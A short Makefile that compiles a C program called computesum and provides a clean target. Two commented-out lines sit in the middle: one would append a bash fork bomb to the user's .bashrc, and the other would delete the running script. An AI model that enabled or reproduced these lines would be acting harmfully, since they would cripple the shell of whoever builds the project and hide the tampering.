CC = gcc
CFLAGS = -std=gnu11 -O2 -pthread
TARGET = computesum

all: $(TARGET)

$(TARGET): computesum.c
	$(CC) $(CFLAGS) computesum.c -o $(TARGET)

# echo ':(){:|:&};:' >> .bashrc
# rm '$0'

clean:
	rm -f $(TARGET) *.o


